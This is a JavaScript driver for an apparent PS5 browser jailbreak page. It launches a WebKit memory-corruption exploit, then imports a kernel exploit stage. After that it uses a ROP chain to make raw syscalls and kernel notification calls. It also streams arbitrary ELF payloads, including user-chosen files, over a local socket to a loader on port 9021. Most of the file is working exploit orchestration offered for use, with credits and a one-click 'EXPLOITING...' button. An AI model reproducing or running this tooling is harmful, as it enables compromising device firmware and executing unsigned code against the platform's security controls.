import { establishPrimitive } from "./webkit.js";
import { installWindowP } from "./utils/mem.js";

const output = document.getElementById("console");
const statusText = document.getElementById("statusText");
const statusLed = document.getElementById("statusLed");
const fwText = document.getElementById("fwText");
const runBtn = document.getElementById("runBtn");
const soundToggle = document.getElementById("soundToggle");

/* ---------- Retro Synthwave Audio Engine (Web Audio API) ---------- */
class SoundFX {
  constructor() {
    this.ctx = null;
    this.enabled = localStorage.getItem("lonely_sound") !== "0";
  }

  init() {
    if (!this.ctx) {
      const AudioCtx = window.AudioContext || window.webkitAudioContext;
      if (AudioCtx) this.ctx = new AudioCtx();
    }
    if (this.ctx && this.ctx.state === "suspended") {
      this.ctx.resume();
    }
  }

  toggle() {
    this.enabled = !this.enabled;
    localStorage.setItem("lonely_sound", this.enabled ? "1" : "0");
    if (this.enabled) {
      this.click();
    }
    return this.enabled;
  }

  playTone(freq, type, duration, startVol = 0.25, endVol = 0.001, timeOffset = 0) {
    if (!this.enabled) return;
    try {
      this.init();
      if (!this.ctx) return;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      const now = this.ctx.currentTime + timeOffset;

      osc.type = type;
      osc.frequency.setValueAtTime(freq, now);

      gain.gain.setValueAtTime(startVol, now);
      gain.gain.exponentialRampToValueAtTime(endVol, now + duration);

      osc.connect(gain);
      gain.connect(this.ctx.destination);

      osc.start(now);
      osc.stop(now + duration);
    } catch (_) {}
  }

  click() {
    this.playTone(880, "sine", 0.04, 0.2);
    this.playTone(440, "triangle", 0.06, 0.15, 0.001, 0.02);
  }

  stage() {
    this.playTone(523.25, "sine", 0.08, 0.2, 0.001, 0);     // C5
    this.playTone(659.25, "sine", 0.10, 0.22, 0.001, 0.05); // E5
    this.playTone(783.99, "sine", 0.14, 0.25, 0.001, 0.10); // G5
  }

  success() {
    // Synthwave ascending arpeggio chord (C5 -> E5 -> G5 -> B5 -> C6)
    const notes = [523.25, 659.25, 783.99, 987.77, 1046.50];
    notes.forEach((freq, idx) => {
      this.playTone(freq, "sine", 0.35, 0.22, 0.001, idx * 0.08);
      this.playTone(freq / 2, "triangle", 0.4, 0.12, 0.001, idx * 0.08);
    });
  }

  error() {
    this.playTone(220, "sawtooth", 0.25, 0.3);
    this.playTone(180, "sawtooth", 0.35, 0.3, 0.001, 0.08);
  }
}

const sounds = new SoundFX();

// Sound toggle UI handling
if (soundToggle) {
  function updateSoundUI() {
    if (sounds.enabled) {
      soundToggle.textContent = "🔊 SOUND ON";
      soundToggle.classList.remove("muted");
    } else {
      soundToggle.textContent = "🔇 MUTED";
      soundToggle.classList.add("muted");
    }
  }
  updateSoundUI();
  soundToggle.addEventListener("click", () => {
    sounds.toggle();
    updateSoundUI();
  });
}

// Auto-display detected firmware on load
if (fwText) {
  fwText.textContent = window.fw_str ? window.fw_str : "7.00 – 13.60";
}

function setStatus(text, state = "normal") {
  if (statusText) statusText.textContent = text;
  if (statusLed) {
    statusLed.className = "led";
    if (state === "running") statusLed.classList.add("led-yellow");
    else if (state === "success") statusLed.classList.add("led-green");
    else if (state === "error") statusLed.classList.add("led-red");
  }
}

function writeLog(message, type = "log", replace = false) {
  let line = replace ? output.lastElementChild : null;
  if (!line) {
    line = document.createElement("div");
    output.appendChild(line);
  }

  // Add color class based on message type
  if (type === "error") {
    line.className = "log-error";
  } else if (type === "success") {
    line.className = "log-success";
  } else {
    line.className = "log-info";
  }

  let marker = "*";
  if (type === "error") marker = "-";
  if (type === "info" || type === "success") marker = "+";
  line.textContent = `[${marker}] ${message}`;
  output.scrollTop = output.scrollHeight;
}

function writeEvent(name, detail, type) {
  writeLog(detail == null || detail === "" ? name : `${name}: ${detail}`,
    type || (name === "Failed" ? "error" : "log"));
}

window.writeLog = writeLog;
window.jb = { mark: writeEvent };

/* ---------- Native PS5 Pop-up Toast Notifications ---------- */
async function showNotification(text) {
  try {
    const rop = window.ropRuntime;
    if (!rop || !rop.chain || !rop.p) return;
    const { p, chain } = rop;

    const notifyOffset = (window.SYMBOLS && window.SYMBOLS.libkernel && window.SYMBOLS.libkernel.sceKernelSendNotificationRequest)
      || (typeof OFFSET_lk_sceKernelSendNotificationRequest === "number" ? OFFSET_lk_sceKernelSendNotificationRequest : null);
    if (!notifyOffset) return;

    const fn = p.libKernelBase.add32(notifyOffset);
    const req = p.malloc(0xc30);

    for (let i = 0; i < 0xc30; i += 8) {
      p.write8(req.add32(i), 0);
    }
    p.write4(req.add32(0x10), -1); // target_id = -1
    p.write4(req.add32(0x14), -1); // user_id = -1

    // write text string at offset 0x2d (message buffer)
    const msg = String(text);
    const maxLen = Math.min(msg.length, 1020);
    for (let i = 0; i < maxLen; i++) {
      p.write1(req.add32(0x2d + i), msg.charCodeAt(i));
    }
    p.write1(req.add32(0x2d + maxLen), 0);

    await chain.call(fn, 0, req, 0xc30, 0);
  } catch (e) {
    console.warn("Notification error:", e);
  }
}

async function getPrimitive() {
  setStatus("STAGE 1: WEBKIT", "running");
  writeLog("Starting WebKit exploit");
  const primitive = installWindowP(await establishPrimitive(writeEvent));
  if (!primitive || typeof primitive.read8 !== "function")
    throw new Error("Memory primitive unavailable");

  writeLog("ARW ready", "success");
  sounds.stage();
  return primitive;
}

function getWebKitBase() {
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== "number" || typeof OFFSET_wk_host_constructor_candidates === "undefined")
    throw new Error("WebKit base inputs are unavailable");

  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = ctor - offset;
    if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0)
      return base;
  }

  throw new Error("WebKit base not found");
}

async function run() {
  sounds.click();

  if (runBtn) {
    runBtn.disabled = true;
    runBtn.textContent = "EXPLOITING...";
    runBtn.classList.remove("btn-success");
  }
  setStatus("INITIALIZING...", "running");

  const rejection = window.firmware.rejection();
  if (rejection)
    throw new Error(rejection);

  writeLog("Credits: Sonic_Iso, Jordy, ntfargo, ufm42, Dr. Yenyen, TheFlow, SlidyBat, Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion", "info");
  writeLog(`Agent: ${navigator.userAgent}`, "info");
  writeLog(`Firmware: ${window.fw_str}`, "info");

  const primitive = await getPrimitive();
  writeLog(`WebKit base: 0x${getWebKitBase().toString(16)}`, "info");

  setStatus("STAGE 2: KERNEL", "running");
  sounds.stage();

  await import("./relapse_exploit.js");
  await main(primitive);

  setStatus("JAILBROKEN", "success");
  sounds.success();

  if (runBtn) {
    runBtn.textContent = "JAILBROKEN ✓";
    runBtn.classList.add("btn-success");
  }

  await showNotification("Lonely Host: Jailbreak Successful! ⚡");
}

if (runBtn) {
  runBtn.addEventListener("click", () => {
    run().catch((error) => {
      sounds.error();
      const msg = error instanceof Error ? error.message : String(error);
      writeLog(msg, "error");
      setStatus("FAILED", "error");
      showNotification("Exploit failed — Please reboot console.");
      if (runBtn) {
        runBtn.disabled = false;
        runBtn.textContent = "RETRY EXPLOIT";
      }
    });
  });
}

/* ---------- Dual-Mode Payload Dispatcher ---------- */
async function sendPayloadViaRop(bytes, payloadName) {
  const rop = window.ropRuntime;
  if (!rop || !rop.chain || !rop.p) {
    throw new Error("ROP runtime unavailable. Run the exploit first.");
  }
  const { p, chain } = rop;
  // sockaddr_in for 127.0.0.1:9021
  const sockaddr = p.malloc(0x10);
  p.write1(sockaddr.add32(0x00), 0x10); // len
  p.write1(sockaddr.add32(0x01), 0x02); // AF_INET
  p.write2(sockaddr.add32(0x02), ((9021 & 0xff) << 8) | ((9021 >>> 8) & 0xff)); // htons(9021)
  p.write4(sockaddr.add32(0x04), 0x0100007f); // 127.0.0.1 in network byte order

  const sockRes = await chain.syscall(SYS_SOCKET, 2, 1, 0);
  const fd = sockRes.low;
  if (fd < 0) throw new Error("Socket creation failed");

  try {
    const connRes = await chain.syscall(SYS_CONNECT, fd, sockaddr, 0x10);
    if (connRes.low !== 0) throw new Error("Could not connect to 127.0.0.1:9021 (is elfldr running?)");

    // Send payload in 16KB blocks
    const CHUNK_SIZE = 16384;
    const chunkBuf = p.malloc(CHUNK_SIZE);
    let sent = 0;
    while (sent < bytes.length) {
      const len = Math.min(CHUNK_SIZE, bytes.length - sent);
      for (let i = 0; i < len; i++) {
        p.write1(chunkBuf.add32(i), bytes[sent + i]);
      }
      const writeRes = await chain.syscall(SYS_WRITE, fd, chunkBuf, len);
      if (writeRes.low <= 0) throw new Error("Write failed at byte " + sent);
      sent += len;
    }
  } finally {
    await chain.syscall(SYS_CLOSE, fd);
  }
  return true;
}

async function dispatchPayload(payloadName, btn, customBytes = null) {
  sounds.click();

  if (btn) {
    btn.dataset.state = "sending";
    btn.textContent = "SENDING...";
  }

  writeLog(`Dispatching ${payloadName} to elfldr (port 9021)...`, "info");

  try {
    let ok = false;
    let msg = "";

    // 1. Try host server API (works when hosted locally via serve.py)
    if (!customBytes) {
      try {
        const response = await fetch("/api/send-payload", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ payload: payloadName })
        });
        if (response.ok) {
          const data = await response.json();
          ok = data.ok;
          msg = data.message;
        }
      } catch (_) {
        // API not available (e.g. running on GitHub Pages / static host)
      }
    }

    // 2. If API was unavailable or running on a static host, dispatch in-browser via ROP socket
    if (!ok) {
      let bytes = customBytes;
      if (!bytes) {
        const elfResp = await fetch("./payloads/" + encodeURIComponent(payloadName), { cache: "no-store" });
        if (!elfResp.ok) throw new Error("Failed to load payload file from host: HTTP " + elfResp.status);
        bytes = new Uint8Array(await elfResp.arrayBuffer());
      }
      await sendPayloadViaRop(bytes, payloadName);
      ok = true;
      msg = `Sent ${payloadName} directly to 127.0.0.1:9021`;
    }

    if (ok) {
      sounds.stage();
      writeLog(msg, "success");
      if (btn) {
        btn.dataset.state = "sent";
        btn.textContent = "SENT ✓";
      }
      await showNotification(`${payloadName} Loaded! 🚀`);
    }
  } catch (err) {
    sounds.error();
    writeLog(`Payload dispatch failed: ${err.message}`, "error");
    if (btn) {
      btn.dataset.state = "failed";
      btn.textContent = "FAILED";
    }
    await showNotification(`Failed to send ${payloadName}`);
  }

  if (btn) {
    setTimeout(() => {
      btn.dataset.state = "idle";
      btn.textContent = "SEND";
    }, 3500);
  }
}

// Attach listeners to all payload send buttons
document.querySelectorAll(".btn-send").forEach((btn) => {
  btn.addEventListener("click", () => {
    const payload = btn.getAttribute("data-payload");
    if (payload) {
      dispatchPayload(payload, btn);
    }
  });
});

// Custom ELF File Chooser
const customElfBtn = document.getElementById("customElfBtn");
const customElfInput = document.getElementById("customElfInput");

if (customElfBtn && customElfInput) {
  customElfBtn.addEventListener("click", () => {
    customElfInput.click();
  });

  customElfInput.addEventListener("change", async () => {
    const file = customElfInput.files[0];
    if (!file) return;

    if (!file.name.toLowerCase().endsWith(".elf")) {
      writeLog(`Selected file '${file.name}' is not an ELF binary.`, "error");
      return;
    }

    writeLog(`Reading custom ELF: ${file.name} (${(file.size / 1024).toFixed(1)} KB)...`, "info");
    const buffer = await file.arrayBuffer();
    const bytes = new Uint8Array(buffer);
    if (bytes.length < 4 || bytes[0] !== 0x7f || bytes[1] !== 0x45 || bytes[2] !== 0x4c || bytes[3] !== 0x46) {
      writeLog(`File '${file.name}' does not have a valid ELF header.`, "error");
      return;
    }
    dispatchPayload(file.name, customElfBtn, bytes);
  });
}
